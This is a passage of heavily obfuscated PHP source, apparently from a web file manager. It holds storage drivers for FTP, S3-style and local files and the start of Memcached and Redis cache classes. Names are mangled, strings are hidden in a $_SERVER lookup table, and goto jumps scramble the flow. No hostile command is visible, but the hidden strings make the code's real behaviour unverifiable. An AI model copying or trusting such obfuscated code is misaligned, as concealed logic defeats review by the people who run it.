$º¢ŠÎ‹°[96] => $ÔÄãÖïÊ); } public function has($Çİş¡ÏË, $¦½ÊÊÕ = false, $Ş…ñŠÚ = true) { $™Œ¢»ƒ =& $_SERVER[Õò”†—·]; $öíÙÁ®ù = $ü¸’ûŸ = array(); $óŠ§±× = $¦½ÊÊÕ ? !0 : !1; $this->fileList($Çİş¡ÏË, $öíÙÁ®ù, $ü¸’ûŸ, $óŠ§±×); if ($¦½ÊÊÕ) { return array($™Œ¢»ƒ[240] => count($ü¸’ûŸ), $™Œ¢»ƒ[241] => count($öíÙÁ®ù)); } if ($Ş…ñŠÚ) { if (count($ü¸’ûŸ)) { return !0; } } else { if (count($öíÙÁ®ù)) { return !0; } } return !1; } public function listAll($öœƒƒÔæ) { $ùºìüœÅ =& $_SERVER[Õò”†—·]; if (!$this->_isconn()) { return !1; } $—¦ê©Å = $î§Ÿ®¹„ = array(); $this->fileList($öœƒƒÔæ, $—¦ê©Å, $î§Ÿ®¹„, !0); $ßäÙÃºà = array_to_keyvalue($î§Ÿ®¹„, $ùºìüœÅ[42]); foreach ($—¦ê©Å as $¾Ê¿ôÂÄ) { if (is_string($¾Ê¿ôÂÄ)) { $ßäÙÃºà[$¾Ê¿ôÂÄ] = array($ùºìüœÅ[89] => 0); } } return $this->listAllFiles($öœƒƒÔæ, $ßäÙÃºà); } public function getContent($®”ú¨¹Š) { if (!$this->_isconn()) { return !1; } $®”ú¨¹Š = $this->iconvSystem($®”ú¨¹Š); return $this->fileSubstr($®”ú¨¹Š); } public function setContent($íİÌ»¿ı, $œëĞè¥ü = '') { if (!$this->_isconn()) { return !1; } $âù¥¢õ« = $this->pathThis($this->iconvSystem($íİÌ»¿ı)); $¥úİ‹Ê» = $this->tempFile($âù¥¢õ«); file_put_contents($¥úİ‹Ê», $œëĞè¥ü); $×¯ĞİöÎ = $this->upload($íİÌ»¿ı, $this->iconvApp($¥úİ‹Ê»)); $this->tempFileRemve($¥úİ‹Ê»); return $×¯ĞİöÎ; } public function fileSubstr($”—Œ«§Ì, $³¢†’éå = 0, $µ¢ßæŞ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($”—Œ«§Ì, $³¢†’éå, $µ¢ßæŞ); } private function ftpRequest($³±ñª¯ª, $„›×Ò™İ = 0, $ÔÊß¿’á = false) { $³±ñª¯ª = $this->iconvSystem($³±ñª¯ª); $¹Û’†İ¶ = $this->scheme . $this->host . $_SERVER[Õò”†—·][4] . $this->port; $ç†Ü” = curl_init(); curl_setopt($ç†Ü”, CURLOPT_URL, $¹Û’†İ¶ . $this->pathEncode($³±ñª¯ª)); curl_setopt($ç†Ü”, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ÔÊß¿’á) { $ùÓ³…ïı = $„›×Ò™İ + $ÔÊß¿’á - 1; curl_setopt($ç†Ü”, CURLOPT_RANGE, "{$„›×Ò™İ}\55{$ùÓ³…ïı}"); } curl_setopt($ç†Ü”, CURLOPT_RETURNTRANSFER, 1); $‡ûÒüä = curl_exec($ç†Ü”); curl_close($ç†Ü”); return $‡ûÒüä; } public function upload($è•ØÇ•³, $Ÿøµ€µ, $’÷õÉ³ö = false, $ˆÌÖÃŞ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($è•ØÇ•³))) { return !1; } $è•ØÇ•³ = $this->iconvSystem($è•ØÇ•³); $Ÿøµ€µ = $this->iconvSystem($Ÿøµ€µ); $ªğÊä¡ = ftp_nb_put($this->connect, $è•ØÇ•³, $Ÿøµ€µ, FTP_BINARY); while ($ªğÊä¡ == FTP_MOREDATA) { $ªğÊä¡ = ftp_nb_continue($this->connect); } if ($ªğÊä¡ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][1419], !0); return !1; } return $this->getPathOuter($è•ØÇ•³); } public function download($ã„şˆØ, $Ôª‘ô–í = '') { if (!$this->_isconn()) { return !1; } $§¤È‰Î = $this->pathFather($Ôª‘ô–í); if (!IO::mkdir($§¤È‰Î)) { return !1; } $ã„şˆØ = $this->iconvSystem($ã„şˆØ); $Ôª‘ô–í = $this->iconvSystem($Ôª‘ô–í); $õ­¹•µ‡ = ftp_nb_get($this->connect, $Ôª‘ô–í, $ã„şˆØ, FTP_BINARY); while ($õ­¹•µ‡ == FTP_MOREDATA) { $õ­¹•µ‡ = ftp_nb_continue($this->connect); } if ($õ­¹•µ‡ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][1419], !0); return !1; } return $this->iconvApp($Ôª‘ô–í); } public function exist($¹æøèÈö) { return $this->isFile($¹æøèÈö) || $this->isFolder($¹æøèÈö); } public function isFile($Á÷†È¿) { return !$this->isFolder($Á÷†È¿) && $this->objectMeta($Á÷†È¿); } public function isFolder($ø±’ıâÍ) { return $this->cacheMethod($_SERVER[Õò”†—·][179], $ø±’ıâÍ); } protected function objectMeta($»¡ÁŸ÷º) { return $this->cacheMethod($_SERVER[Õò”†—·][181], $»¡ÁŸ÷º); } protected function _objectMeta($õÙ¹ºïÀ) { $çœèëƒü =& $_SERVER[Õò”†—·]; if ($õÙ¹ºïÀ == $çœèëƒü[22] || $õÙ¹ºïÀ == $çœèëƒü[18]) { return array(); } if (!$this->_isconn()) { return !1; } $õÙ¹ºïÀ = $this->iconvSystem($õÙ¹ºïÀ); $Ş–ŒŸ»ö = array($çœèëƒü[42] => $this->iconvApp($õÙ¹ºïÀ), $çœèëƒü[43] => $çœèëƒü[231], $çœèëƒü[89] => 0); @ftp_chdir($this->connect, $çœèëƒü[18]); $ôƒÂ¦Üç = @ftp_size($this->connect, $õÙ¹ºïÀ); if ($ôƒÂ¦Üç != -1) { $Ş–ŒŸ»ö[$çœèëƒü[89]] = $ôƒÂ¦Üç; } else { $«ÓşÀ˜½ = @ftp_chdir($this->connect, $õÙ¹ºïÀ); if (!$«ÓşÀ˜½) { return !1; } $Ş–ŒŸ»ö[$çœèëƒü[43]] = $çœèëƒü[88]; } return $Ş–ŒŸ»ö; } protected function _isFolder($Š¡ûĞ²Ç) { $®ŸÂÓ£Ê =& $_SERVER[Õò”†—·]; if ($Š¡ûĞ²Ç == $®ŸÂÓ£Ê[22] || $Š¡ûĞ²Ç == $®ŸÂÓ£Ê[18]) { return !0; } $Ü¤µ÷êÙ = $this->_objectMeta($Š¡ûĞ²Ç); return isset($Ü¤µ÷êÙ[$®ŸÂÓ£Ê[43]]) && $Ü¤µ÷êÙ[$®ŸÂÓ£Ê[43]] == $®ŸÂÓ£Ê[88] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($¦üˆÄŞ¼) { parent::__construct($¦üˆÄŞ¼); $this->setSignVersion($_SERVER[Õò”†—·][248]); } public function uploadLink($×ª‰šæ, $ŠŸ¨‹ö = 0) { $õ°–éÃ½ =& $_SERVER[Õò”†—·]; if ($this->isUploadServer()) { return; } $ÙŠØÖù¹ = $this->getType(); if (!in_array($ÙŠØÖù¹, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¬á“°“ = (!$ŠŸ¨‹ö ? 1 : ceil($ŠŸ¨‹ö / pow(1024, 3))) * 3600 * 4; $Ÿñ¹Ùæë = $this->multiUploadFormData($×ª‰šæ, $¬á“°“); if ($Ÿñ¹Ùæë) { $Ÿñ¹Ùæë[$õ°–éÃ½[107]] = $×ª‰šæ; $Ÿñ¹Ùæë[$õ°–éÃ½[108]] = $ÙŠØÖù¹; } return $Ÿñ¹Ùæë; } public function fileOutImage($ëš¸æß÷, $â¸’‡îŠ = 250) { if ($this->size($ëš¸æß÷) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ëš¸æß÷, $â¸’‡îŠ); } $ííô˜¿† = $this->link($ëš¸æß÷); $ííô˜¿† .= $_SERVER[Õò”†—·][1422] . $â¸’‡îŠ; $this->fileOutLink($ííô˜¿†); } public function fileOutLink($¯Ò¯÷ÓÅ) { $îæĞŞìı =& $_SERVER[Õò”†—·]; if (substr($¯Ò¯÷ÓÅ, 0, 7) == $îæĞŞìı[1378]) { $¯Ò¯÷ÓÅ = $îæĞŞìı[1379] . substr($¯Ò¯÷ÓÅ, 7); } header($îæĞŞìı[175] . $¯Ò¯÷ÓÅ); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Õñº¦Æ¹) { if (substr($Õñº¦Æ¹, 0, 2) == $_SERVER[Õò”†—·][1409]) { $Õñº¦Æ¹ = BASIC_PATH . substr($Õñº¦Æ¹, 2); } return $Õñº¦Æ¹; } public function iconvApp($±»«Èâ¼) { $Î¤ÃÎ§à =& $_SERVER[Õò”†—·]; global $config; return $this->iconvTo($±»«Èâ¼, $config[$Î¤ÃÎ§à[1407]], $config[$Î¤ÃÎ§à[1406]]); } public function iconvSystem($ßœÓ ½) { $îì›ˆ‹ø =& $_SERVER[Õò”†—·]; global $config; return $this->iconvTo($ßœÓ ½, $config[$îì›ˆ‹ø[1406]], $config[$îì›ˆ‹ø[1407]]); } public function getPathOuter($¦ä”²ƒ‡) { $ÜíÔÄ¼Ó =& $_SERVER[Õò”†—·]; $éÊÃï¤ = $this->iconvApp($this->pathBase); $¦ä”²ƒ‡ = $this->iconvApp($¦ä”²ƒ‡); if (substr($éÊÃï¤, 0, 2) == $ÜíÔÄ¼Ó[1409]) { $éÊÃï¤ = BASIC_PATH . substr($éÊÃï¤, 2); } if (substr($¦ä”²ƒ‡, 0, 2) == $ÜíÔÄ¼Ó[1409]) { $¦ä”²ƒ‡ = BASIC_PATH . substr($¦ä”²ƒ‡, 2); } $éÊÃï¤ = KodIO::clear($éÊÃï¤); $¦ä”²ƒ‡ = KodIO::clear($¦ä”²ƒ‡); $¦ä”²ƒ‡ = substr($¦ä”²ƒ‡, strlen($éÊÃï¤)); if (empty($this->pathDriver)) { return $¦ä”²ƒ‡; } return $this->pathDriver . $ÜíÔÄ¼Ó[18] . ltrim($¦ä”²ƒ‡, $ÜíÔÄ¼Ó[18]); } public function mkfile($³¡Äõîª, $ßˆ¹˜š = '', $¿öÅµ«ñ = REPEAT_RENAME) { $³¡Äõîª = $this->iconvSystem($³¡Äõîª); @touch($³¡Äõîª); if ($ßˆ¹˜š) { file_put_contents($³¡Äõîª, $ßˆ¹˜š); } @chmod($³¡Äõîª, $this->pathAuth); if (is_file($³¡Äõîª)) { return $this->getPathOuter($³¡Äõîª); } $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][1419], !0); return !1; } public function mkdir($½È×ƒ°, $Óíû×¼ = REPEAT_SKIP) { $½È×ƒ° = $this->iconvSystem($½È×ƒ°); if (is_dir($½È×ƒ°)) { return $this->getPathOuter($½È×ƒ°); } @mkdir($½È×ƒ°, $this->pathAuth, !0); @chmod($½È×ƒ°, $this->pathAuth); if (is_dir($½È×ƒ°)) { return $this->getPathOuter($½È×ƒ°); } $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][1419], !0); return !1; } public function copyFile($êşç…®Ï, $Ãå£íÔ‘) { $this->mkdir($this->pathFather($Ãå£íÔ‘)); $êşç…®Ï = $this->iconvSystem($êşç…®Ï); $Ãå£íÔ‘ = $this->iconvSystem($Ãå£íÔ‘); $˜›…åËß = copy_64($êşç…®Ï, $Ãå£íÔ‘); @chmod($Ãå£íÔ‘, $this->pathAuth); if ($˜›…åËß) { return $this->getPathOuter($Ãå£íÔ‘); } $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][1419], !0); return !1; } public function moveFile($à£ŠâŒî, $ÜŠñĞ…Ç) { $this->mkdir($this->pathFather($ÜŠñĞ…Ç)); $à£ŠâŒî = $this->iconvSystem($à£ŠâŒî); $ÜŠñĞ…Ç = $this->iconvSystem($ÜŠñĞ…Ç); $œÇ³Ï÷ = intval(@rename($à£ŠâŒî, $ÜŠñĞ…Ç)); if (!$œÇ³Ï÷) { if ($œÇ³Ï÷ = intval(@copy_64($à£ŠâŒî, $ÜŠñĞ…Ç))) { @unlink($à£ŠâŒî); } } @chmod($ÜŠñĞ…Ç, $this->pathAuth); if ($œÇ³Ï÷) { return $this->getPathOuter($ÜŠñĞ…Ç); } $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][1419], !0); return !1; } public function movePath($ÈœÀÌŒÂ, $ô º‘Ó›, $®çÖ“îş = false) { $ƒ¿¿Å˜Ó =& $_SERVER[Õò”†—·]; $ÈœÀÌŒÂ = $this->iconvSystem($ÈœÀÌŒÂ); $ô º‘Ó› = $this->iconvSystem($ô º‘Ó›); $¸ŠĞ×¿ = rtrim($ô º‘Ó›, $ƒ¿¿Å˜Ó[18]) . $ƒ¿¿Å˜Ó[18] . ($®çÖ“îş ? $®çÖ“îş : get_path_this($ÈœÀÌŒÂ)); if (file_exists($¸ŠĞ×¿)) { return !1; } $™Òıêµ˜ = intval(@rename($ÈœÀÌŒÂ, $¸ŠĞ×¿)); $™Òıêµ˜ = file_exists($¸ŠĞ×¿); if ($™Òıêµ˜) { return $this->getPathOuter($¸ŠĞ×¿); } $this->writeLog(__FUNCTION__ . $ƒ¿¿Å˜Ó[1419], !0); return !1; } public function delFile($ç¥äÈãâ) { $ç¥äÈãâ = $this->iconvSystem($ç¥äÈãâ); if (!@unlink($ç¥äÈãâ)) { @chmod($ç¥äÈãâ, $this->pathAuth); if (@unlink($ç¥äÈãâ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][1419], !0); return !1; } return !0; } public function delFolder($ÌŒšËï) { $èÅ¢â =& $_SERVER[Õò”†—·]; $ÌŒšËï = $this->iconvSystem($ÌŒšËï); if (!is_dir($ÌŒšËï)) { return !0; } if (!($¯ã„ŞÃè = opendir($ÌŒšËï))) { return !1; } while (($€ûÆ¯Ïå = readdir($¯ã„ŞÃè)) !== !1) { if ($€ûÆ¯Ïå == $èÅ¢â[20] || $€ûÆ¯Ïå == $èÅ¢â[1332]) { continue; } $ĞèúÔ–† = $ÌŒšËï . $èÅ¢â[18] . $€ûÆ¯Ïå; if (is_file($ĞèúÔ–†) || is_link($ĞèúÔ–†)) { if (!unlink($ĞèúÔ–†)) { chmod($ĞèúÔ–†, $this->pathAuth); if (!unlink($ĞèúÔ–†)) { return !1; } } } else { if (is_dir($ĞèúÔ–†)) { chmod($ĞèúÔ–†, $this->pathAuth); $ĞèúÔ–† = $this->iconvApp($ĞèúÔ–†); if (!$this->delFolder($ĞèúÔ–†)) { return !1; } } } } closedir($¯ã„ŞÃè); return rmdir($ÌŒšËï); } public function rename($äéùË×Ì, $µ»³¥ƒÛ) { $»ÇŞ¬‹¦ =& $_SERVER[Õò”†—·]; $âÜµê = $this->fileNameAuto($this->pathFather($äéùË×Ì), $µ»³¥ƒÛ); $âÜµê = $this->iconvSystem($âÜµê); $äéùË×Ì = $this->iconvSystem($äéùË×Ì); $‰£ÃÜã = $this->pathFather($äéùË×Ì); $Äùã¯ = rtrim($‰£ÃÜã, $»ÇŞ¬‹¦[18]) . $»ÇŞ¬‹¦[18] . $âÜµê; $§¡üØ = @rename($äéùË×Ì, $Äùã¯); $Äùã¯ = $this->iconvApp($Äùã¯); if ($§¡üØ) { return $this->getPathOuter($Äùã¯); } $this->writeLog(__FUNCTION__ . $»ÇŞ¬‹¦[1419], !0); return !1; } public function size($ ¨™»Ñ…) { $ ¨™»Ñ… = $this->iconvSystem($ ¨™»Ñ…); return filesize_64($ ¨™»Ñ…); } public function info($è îÆƒ›) { $è îÆƒ› = $this->iconvSystem($è îÆƒ›); if ($this->isFolder($è îÆƒ›)) { return $this->folderInfo($è îÆƒ›); } else { if ($this->isFile($è îÆƒ›)) { return $this->fileInfo($è îÆƒ›); } } return !1; } protected function infoChildren($ŸÒ”±ğ¿, &$İ Úª×Ï, $¬çÄ™× = true) { $Ù÷Ø„³Ö =& $_SERVER[Õò”†—·]; check_abort_echo(); $ŸÒ”±ğ¿ = rtrim($ŸÒ”±ğ¿, $Ù÷Ø„³Ö[18]) . $Ù÷Ø„³Ö[18]; if ($¬çÄ™×) { $ŸÒ”±ğ¿ = $this->iconvSystem($ŸÒ”±ğ¿); } if (!($´ÃÎËÆ¨ = @opendir($ŸÒ”±ğ¿))) { return; } while (($šÔ‹êÖ = readdir($´ÃÎËÆ¨)) !== !1) { if ($šÔ‹êÖ == $Ù÷Ø„³Ö[20] || $šÔ‹êÖ == $Ù÷Ø„³Ö[1332]) { continue; } $‘şç¥« = $ŸÒ”±ğ¿ . $šÔ‹êÖ; if (is_file($‘şç¥«) || is_link($‘şç¥«)) { $İ Úª×Ï[$Ù÷Ø„³Ö[90]]++; $İ Úª×Ï[$Ù÷Ø„³Ö[89]] += filesize_64($‘şç¥«); } else { if (is_dir($‘şç¥«)) { $İ Úª×Ï[$Ù÷Ø„³Ö[91]]++; $this->infoChildren($‘şç¥«, $İ Úª×Ï, !1); } } } closedir($´ÃÎËÆ¨); } private function folderInfo($­–Ğøã, $âÆ£ÔÂá = false) { $˜ºÙòÁ“ =& $_SERVER[Õò”†—·]; $­–Ğøã = rtrim($­–Ğøã, $˜ºÙòÁ“[18]) . $˜ºÙòÁ“[18]; $ÆçÙÏ­‡ = $this->iconvApp($this->pathThis($­–Ğøã)); if ($âÆ£ÔÂá) { return array($˜ºÙòÁ“[42] => $ÆçÙÏ­‡, $˜ºÙòÁ“[97] => $this->getPathOuter($­–Ğøã), $˜ºÙòÁ“[43] => $˜ºÙòÁ“[88]); } $ÑõÁÏµì = array($˜ºÙòÁ“[42] => $ÆçÙÏ­‡, $˜ºÙòÁ“[97] => $this->getPathOuter($­–Ğøã), $˜ºÙòÁ“[43] => $˜ºÙòÁ“[88], $˜ºÙòÁ“[232] => @filectime($­–Ğøã), $˜ºÙòÁ“[98] => @filemtime($­–Ğøã), $˜ºÙòÁ“[1423] => @fileatime($­–Ğøã), $˜ºÙòÁ“[1424] => is_readable($­–Ğøã), $˜ºÙòÁ“[1425] => is_writable($­–Ğøã), $˜ºÙòÁ“[1426] => get_mode($­–Ğøã)); return $ÑõÁÏµì; } private function fileInfo($ÕğìàŒ×, $õÛÀÇ£ = false) { $ø¼›†ş÷ =& $_SERVER[Õò”†—·]; $¨´ê¸ì‚ = $this->iconvApp($this->pathThis($ÕğìàŒ×)); if ($õÛÀÇ£) { return array($ø¼›†ş÷[42] => $¨´ê¸ì‚, $ø¼›†ş÷[97] => $this->getPathOuter($ÕğìàŒ×), $ø¼›†ş÷[43] => $ø¼›†ş÷[231], $ø¼›†ş÷[89] => $this->size($ÕğìàŒ×), $ø¼›†ş÷[188] => $this->ext($¨´ê¸ì‚)); } $÷Â¨ø = array($ø¼›†ş÷[42] => $¨´ê¸ì‚, $ø¼›†ş÷[97] => $this->getPathOuter($ÕğìàŒ×), $ø¼›†ş÷[43] => $ø¼›†ş÷[231], $ø¼›†ş÷[232] => @filectime($ÕğìàŒ×), $ø¼›†ş÷[98] => @filemtime($ÕğìàŒ×), $ø¼›†ş÷[1423] => @fileatime($ÕğìàŒ×), $ø¼›†ş÷[89] => $this->size($ÕğìàŒ×), $ø¼›†ş÷[188] => $this->ext($¨´ê¸ì‚), $ø¼›†ş÷[1424] => is_readable($ÕğìàŒ×), $ø¼›†ş÷[1425] => is_writable($ÕğìàŒ×), $ø¼›†ş÷[1426] => get_mode($ÕğìàŒ×)); return $÷Â¨ø; } public function exist($äÏš»‰Ë) { $äÏš»‰Ë = $this->iconvSystem($äÏš»‰Ë); return @file_exists($äÏš»‰Ë); } public function isFile($åÚ»ÚÔê) { $åÚ»ÚÔê = $this->iconvSystem($åÚ»ÚÔê); return @is_file($åÚ»ÚÔê); } public function isFolder($ÏŞç‰–È) { $ÏŞç‰–È = $this->iconvSystem($ÏŞç‰–È); return @is_dir($ÏŞç‰–È); } public function listPath($ß²’¡Ÿä, $í¾µ§ãÂ = false) { $ƒŸñÀ×Ş =& $_SERVER[Õò”†—·]; $ß²’¡Ÿä = $this->iconvSystem($ß²’¡Ÿä); $ß²’¡Ÿä = rtrim($ß²’¡Ÿä, $ƒŸñÀ×Ş[18]) . $ƒŸñÀ×Ş[18]; $¡ÏÛ…„ = array($ƒŸñÀ×Ş[95] => array(), $ƒŸñÀ×Ş[96] => array()); if (!($ıà¦ãèì = @opendir($ß²’¡Ÿä))) { return $¡ÏÛ…„; } while (($¿³ÓşØ = readdir($ıà¦ãèì)) !== !1) { if ($¿³ÓşØ == $ƒŸñÀ×Ş[20] || $¿³ÓşØ == $ƒŸñÀ×Ş[1332]) { continue; } $”µÜæİ‡ = $ß²’¡Ÿä . $¿³ÓşØ; if (is_file($”µÜæİ‡)) { $¡ÏÛ…„[$ƒŸñÀ×Ş[96]][] = $this->fileInfo($”µÜæİ‡, $í¾µ§ãÂ); } else { $¡ÏÛ…„[$ƒŸñÀ×Ş[95]][] = $this->folderInfo($”µÜæİ‡, $í¾µ§ãÂ); } } closedir($ıà¦ãèì); return $¡ÏÛ…„; } public function listAll($ÇÇâîô, &$ñû—ÇµÍ = array()) { $‰¦›©’‹ =& $_SERVER[Õò”†—·]; $ÇÇâîô = $this->iconvSystem($ÇÇâîô); $ÇÇâîô = rtrim($ÇÇâîô, $‰¦›©’‹[18]) . $‰¦›©’‹[18]; if (!($Ù ”ûå = @opendir($ÇÇâîô))) { return $ñû—ÇµÍ; } while (($şŞË¿ßÚ = readdir($Ù ”ûå)) !== !1) { if ($şŞË¿ßÚ == $‰¦›©’‹[20] || $şŞË¿ßÚ == $‰¦›©’‹[1332]) { continue; } $‘¡ËŒ¢¹ = $ÇÇâîô . $şŞË¿ßÚ; $•—›şã‹ = is_dir($‘¡ËŒ¢¹) && !is_link($‘¡ËŒ¢¹) ? 1 : 0; $‘¡ËŒ¢¹ = $•—›şã‹ ? $‘¡ËŒ¢¹ . $‰¦›©’‹[18] : $‘¡ËŒ¢¹; $ñû—ÇµÍ[] = array($‰¦›©’‹[97] => $‘¡ËŒ¢¹, $‰¦›©’‹[88] => $•—›şã‹, $‰¦›©’‹[98] => intval(@filemtime($‘¡ËŒ¢¹)), $‰¦›©’‹[89] => $•—›şã‹ ? 0 : intval($this->size($‘¡ËŒ¢¹))); if ($•—›şã‹) { $this->listAll($‘¡ËŒ¢¹, $ñû—ÇµÍ); } } closedir($Ù ”ûå); return $ñû—ÇµÍ; } public function has($¤—­„Æµ, $ßæ„š§• = false, $ëßçûª¬ = true) { $‡Ïğ•áù =& $_SERVER[Õò”†—·]; $¤—­„Æµ = $this->iconvSystem($¤—­„Æµ); $¤—­„Æµ = rtrim($¤—­„Æµ, $‡Ïğ•áù[18]) . $‡Ïğ•áù[18]; if (!($¨»×æñ = @opendir($¤—­„Æµ))) { return !1; } $Ÿ“ÊÆò = 0; $••èäüÌ = 0; $ÏÜñŞÎ = 0; while (($³İ‹Ó˜‰ = readdir($¨»×æñ)) !== !1) { if ($³İ‹Ó˜‰ == $‡Ïğ•áù[20] || $³İ‹Ó˜‰ == $‡Ïğ•áù[1332]) { continue; } $¿şË¿ÁÔ = $¤—­„Æµ . $³İ‹Ó˜‰; if ($ßæ„š§•) { $ÏÜñŞÎ++; if (@is_file($¿şË¿ÁÔ)) { $Ÿ“ÊÆò++; } else { $••èäüÌ++; } if ($ÏÜñŞÎ > 10000) { break; } continue; } if ($ëßçûª¬) { if (@is_file($¿şË¿ÁÔ)) { return !0; } } else { if (@is_dir($¿şË¿ÁÔ . $‡Ïğ•áù[18])) { return !0; } } } closedir($¨»×æñ); if ($ßæ„š§•) { return array($‡Ïğ•áù[240] => $Ÿ“ÊÆò, $‡Ïğ•áù[241] => $••èäüÌ); } return !1; } public function hashSimple($ÖÆ–ÍÏé) { $§çÃ™¢ =& $_SERVER[Õò”†—·]; if (!$ÖÆ–ÍÏé) { return md5($§çÃ™¢[22]); } $ÖÆ–ÍÏé = $this->iconvSystem($ÖÆ–ÍÏé); $™Æİ«ä = $this->size($ÖÆ–ÍÏé); $û™Î‚ò = 200; $í„Û…ºÅ = 50; if ($™Æİ«ä <= $û™Î‚ò * $í„Û…ºÅ) { return $this->hashMd5($ÖÆ–ÍÏé) . $™Æİ«ä; } $ª¡· ˜Ò = $§çÃ™¢[22]; $É’¹„†İ = intval($™Æİ«ä / $í„Û…ºÅ); $©ĞıÃ©‰ = fopen($ÖÆ–ÍÏé, $§çÃ™¢[1427]); if (!$©ĞıÃ©‰) { return $ª¡· ˜Ò; } for ($ÅÈ·î×Ş = 0; $ÅÈ·î×Ş < $í„Û…ºÅ; $ÅÈ·î×Ş++) { fseek_64($©ĞıÃ©‰, $É’¹„†İ * $ÅÈ·î×Ş); $ª¡· ˜Ò .= fread($©ĞıÃ©‰, $û™Î‚ò); } fseek_64($©ĞıÃ©‰, $™Æİ«ä - $û™Î‚ò); $ª¡· ˜Ò .= fread($©ĞıÃ©‰, $û™Î‚ò); fclose($©ĞıÃ©‰); return md5($ª¡· ˜Ò) . $™Æİ«ä; } public function getContent($‚°Ÿ£Á) { $‚°Ÿ£Á = $this->iconvSystem($‚°Ÿ£Á); return file_get_contents($‚°Ÿ£Á); } public function setContent($µĞ¤†ô, $Î¬µ·Îö = '') { $µĞ¤†ô = $this->iconvSystem($µĞ¤†ô); $Ë„Ãşæõ = @file_put_contents($µĞ¤†ô, $Î¬µ·Îö, LOCK_EX); if (!$Ë„Ãşæõ) { $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][1419], !0); } clearstatcache(); @chmod($µĞ¤†ô, $this->pathAuth); return $Ë„Ãşæõ === !1 ? !1 : !0; } public function fileSubstr($íğ¹‰÷Ê, $ù©•½è = 0, $¶Ë²Ùœ = false) { $ö‚Íª€Ğ =& $_SERVER[Õò”†—·]; $íğ¹‰÷Ê = $this->iconvSystem($íğ¹‰÷Ê); if ($¶Ë²Ùœ === !1) { $¶Ë²Ùœ = $this->size($íğ¹‰÷Ê); } if ($¶Ë²Ùœ <= 0) { return $ö‚Íª€Ğ[22]; } $¯ÎœÓÒ€ = fopen($íğ¹‰÷Ê, $ö‚Íª€Ğ[1427]); if (!$¯ÎœÓÒ€) { return !1; } fseek_64($¯ÎœÓÒ€, $ù©•½è); $šşìÜë½ = fread($¯ÎœÓÒ€, $¶Ë²Ùœ); fclose($¯ÎœÓÒ€); if (!$šşìÜë½) { $this->writeLog(__FUNCTION__ . $ö‚Íª€Ğ[1419], !0); } return $šşìÜë½; } public function upload($ó•Ú‚—ó, $ĞŸ—œ—ô, $óÓÔâˆÈ = false, $Ûı¦õ­ó = REPEAT_REPLACE) { if ($óÓÔâˆÈ) { return $this->moveFile($ĞŸ—œ—ô, $ó•Ú‚—ó); } return $this->copyFile($ĞŸ—œ—ô, $ó•Ú‚—ó); } public function setModifyTime($Õ¼¼ğÁ, $®”ÖÄ = '') { @touch($Õ¼¼ğÁ, intval($®”ÖÄ)); } public function download($ÔäİÍñÔ, $õ è¤„Â) { return $this->iconvSystem($ÔäİÍñÔ); } } goto e¦œéĞÕÂ; f°Ñ‹†·Ïá: define($_SERVER[Õò”†—·][661], $_SERVER[Õò”†—·][662]); $xjayegvzwb = $_SERVER[Õò”†—·][663]; if (!$xjayegvzwb) { return; } goto Båï‚§¨Œ; c¸ç¡“¸ÌÆ: class CacheLockDatabase { public function lock($İÌ‘¼Ø, $¿€Û—Œœ = 0) { $ˆÀñ´ÁØ = Model($_SERVER[Õò”†—·][879]); $ùÄğ‘„Â = microtime(!0) + $¿€Û—Œœ; while (microtime(!0) < $ùÄğ‘„Â) { $ºø±½â± = $ˆÀñ´ÁØ->get($İÌ‘¼Ø); if (!$ºø±½â± || $ºø±½â± < microtime(!0)) { $Çúìã© = $ˆÀñ´ÁØ->set($İÌ‘¼Ø, $ùÄğ‘„Â); if ($Çúìã©) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($õÙÎöŸ’) { return Model($_SERVER[Õò”†—·][879])->get($õÙÎöŸ’); } public function unlock($ËªÁí˜ù) { Model($_SERVER[Õò”†—·][879])->remove($ËªÁí˜ù); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Šùô×±, $şÄ–ÀÜ‘) { $ÑˆÏ…ˆ¢ =& $_SERVER[Õò”†—·]; if (!class_exists($ÑˆÏ…ˆ¢[917])) { show_json($ÑˆÏ…ˆ¢[918], !1); } $this->cacheTime = $şÄ–ÀÜ‘; $this->handle = new Memcached(); if (is_array($Šùô×±[$ÑˆÏ…ˆ¢[919]]) && count($Šùô×±[$ÑˆÏ…ˆ¢[919]]) >= 1) { foreach ($Šùô×±[$ÑˆÏ…ˆ¢[919]] as $¢Åòû¾º) { $¤·õŒÓ = explode($ÑˆÏ…ˆ¢[4], $¢Åòû¾º); $this->handle->addServer($¤·õŒÓ[0], $¤·õŒÓ[1]); } } else { $this->handle->addServer($Šùô×±[$ÑˆÏ…ˆ¢[209]], $Šùô×±[$ÑˆÏ…ˆ¢[210]]); } } public function set($İŞêıÄ©, $§öÉ¥½», $Á–ªâú = false) { $Á–ªâú = $Á–ªâú ? $Á–ªâú : $this->cacheTime; return $this->handle->set($İŞêıÄ©, $§öÉ¥½», $Á–ªâú); } public function get($äŞ…ÈèÏ) { return $this->handle->get($äŞ…ÈèÏ); } public function remove($ÃñĞëê„) { return $this->handle->delete($ÃñĞëê„); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($…¹‹ƒƒ, $èßğ˜ôÆ) { $¾–­¯Ø =& $_SERVER[Õò”†—·]; if (!class_exists($¾–­¯Ø[920])) { show_json($¾–­¯Ø[921], !1); } $this->cacheTime = $èßğ˜ôÆ; $À²×ûÑ = isset($…¹‹ƒƒ[$¾–­¯Ø[922]]) ? 